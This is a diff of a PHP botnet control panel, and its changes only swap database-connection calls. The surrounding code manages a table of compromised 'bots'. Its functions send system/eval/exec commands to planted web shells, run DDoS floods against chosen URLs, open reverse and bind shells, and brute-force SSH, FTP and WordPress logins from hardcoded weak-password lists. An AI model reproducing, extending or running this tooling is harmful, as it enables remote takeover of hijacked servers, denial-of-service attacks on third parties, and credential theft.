@@ -41,7 +41,7 @@ define('PWN_PHP_METHOD', 'system'); //Determine php function being used in PWN a
 
 function checksql() {
 if(CHECKSQL == 1) {
-$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
 if(!$conn) {
 	die('Could not connect to sql - '.mysql_error());
 } else {
@@ -131,7 +131,7 @@ return $response;
 }
 
 function showbots() {
-$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
 mysqli_select_db($conn,SQL_DB );
 
 $data = mysqli_query($conn,"SELECT * FROM `bots`") or die("Shits fuckd up - ".mysql_error());
@@ -415,29 +415,29 @@ echo '<p>'.$quote.'</p>';
 
 function rce()
 {
-$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
-if(isset($_POST['id']) && isset($_POST['cmd']) && isset($_POST['func'])) {
-$check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
-$row = mysql_fetch_array($check);
-if($row !== false && $_POST['func'] == 'system' || $_POST['func'] == 'eval' || $_POST['func'] == 'passthru' || $_POST['func'] == 'exec') {
-echo '</div></div><div class ="post"><h2 class="title"><a href="#">Results</a></h2><div class="entry">';
-echo '<p class="meta">'.$row[url].'?_='.htmlspecialchars($_POST['func']).'&__='.htmlspecialchars($_POST['cmd']).'</p>';
-$x = conn($row[url].'?_='.$_POST['func'].'&__='.urlencode($_POST['cmd']));
-$y = explode("{:|", $x);
-echo '<pre>'.htmlspecialchars($y[1]).'</pre>';
-} else {
-echo '<br/><p>No shell found for id <b>'.htmlspecialchars($_POST['id']).'</b></p>';
+	$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
+	if(isset($_POST['id']) && isset($_POST['cmd']) && isset($_POST['func'])) {
+		$check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = " . mysql_escape_string($_POST['id']) . " LIMIT 1");
+		$row = mysql_fetch_array($check);
+			if($row !== false && $_POST['func'] == 'system' || $_POST['func'] == 'eval' || $_POST['func'] == 'passthru' || $_POST['func'] == 'exec') {
+				echo '</div></div><div class ="post"><h2 class="title"><a href="#">Results</a></h2><div class="entry">';
+				echo '<p class="meta">' . $row[1] . '?_=' . htmlspecialchars($_POST['func']) . '&__=' . htmlspecialchars($_POST['cmd']) . '</p>';
+				$x = conn($row[1].'?_='.$_POST['func'].'&__='.urlencode($_POST['cmd']));
+				$y = explode("{:|", $x);
+				echo '<pre>'.htmlspecialchars($y[1]).'</pre>';
+			} else {
+				echo '<br/><p>No shell found for id <b>'.htmlspecialchars($_POST['id']).'</b></p>';
+			}
 }
-}
-mysqli_close($conn);
+	mysqli_close($conn);
 }
 
 function pwn() {
                         if(isset($_POST['id']) && isset($_POST['os']))
                         {
 
-                            $conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
-                            mysqli_select_db(SQL_DB, $conn);
+                            $conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
+                            
                             $check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
                             $row = mysql_fetch_array($check);
 
@@ -711,8 +711,8 @@ function ddos() {
 
     if(isset($_POST['url']) && isset($_POST['time']) && isset($_POST['sup'])) {
 
-$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysqli_select_db(SQL_DB, $conn);
+$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
+
 $rows = mysqli_query($conn,'SELECT * FROM `bots`', $conn);
 
 if($_POST['sup'] == 'kill') {
@@ -820,8 +820,8 @@ function dos() {
 
     if(isset($_POST['url1']) && isset($_POST['botid1']) && isset($_POST['time1']) && isset($_POST['sup'])) {
 
-$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysqli_select_db(SQL_DB, $conn);
+$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
+
 $check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['botid1'])." LIMIT 1");
 $row = mysql_fetch_array($check);
 if($row !== false) {
@@ -910,8 +910,8 @@ function run() {
 
 if(isset($_POST['cmd']) && isset($_POST['func'])) {
 
-$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysqli_select_db(SQL_DB, $conn);
+$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
+
 $rows = mysqli_query($conn,'SELECT * FROM `bots`', $conn);    
 
 while($row = mysqli_fetch_assoc($rows)) {
@@ -933,8 +933,8 @@ function reverse_shell() {
 
     if(isset($_POST['ip']) && isset($_POST['port']) && isset($_POST['func']) && isset($_POST['id'])) {
 
-    $conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
-    mysqli_select_db(SQL_DB, $conn);
+    $conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
+    
 
     $check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['id'])." LIMIT 1");
     $row = mysql_fetch_array($check);
@@ -996,8 +996,8 @@ function bind_shell() {
 
         if(isset($_POST['bindpassword']) && isset($_POST['bindport']) && isset($_POST['bindid'])) {
 
-    $conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
-    mysqli_select_db(SQL_DB, $conn);
+    $conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
+    
 
     $check = mysqli_query($conn,"SELECT * FROM `bots` WHERE `id` = ".mysql_escape_string($_POST['bindid'])." LIMIT 1");
     $row = mysql_fetch_array($check);
@@ -1152,7 +1152,7 @@ foreach($exploits as $exploit) {
 
 function showbrute() {
 
-$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
+$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
 mysqli_select_db($conn,SQL_DB );
 
 $ftp = 0;
@@ -1191,8 +1191,8 @@ echo '<br /><center>ftp - '.$ftp.' &nbsp;&bull;&nbsp; ssh - '.$ssh.' &nbsp;&bull
 function brute_ssh() {
 
 $passes = array('', 'root', 'test', 'admin', 'zaq123wsx', '1234', '12345', '123456', 'fuckyou', 'Password123');
-$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysqli_select_db(SQL_DB, $conn);
+$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
+
 
     if(isset($_POST['shost']) && isset($_POST['spath']) && isset($_POST['suser'])) {
 
@@ -1315,8 +1315,8 @@ mysqli_close($conn);
 function brute_ftp() {
 
 $passes = array('', 'root', 'test', 'admin', 'zaq123wsx', '1234', '12345', '123456', 'fuckyou', 'Password123');
-$conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
-mysqli_select_db(SQL_DB, $conn);
+$conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
+
 
     if(isset($_POST['shost']) && isset($_POST['spath']) && isset($_POST['suser'])) {
 
@@ -1843,8 +1843,8 @@ function RemoveLastSlash($host)
 function wp_brute() {
     if(isset($_POST['hosts']) && isset($_POST['passwords']) && isset($_POST['usernames']))
 {
-    $conn = mysqli_connect(SQL_HOST, SQL_USER, SQL_PWD);
-    mysqli_select_db(SQL_DB, $conn);
+    $conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
+    
 
     $hosts = trim(filter($_POST['hosts']));
     $passwords = trim(filter($_POST['passwords']));
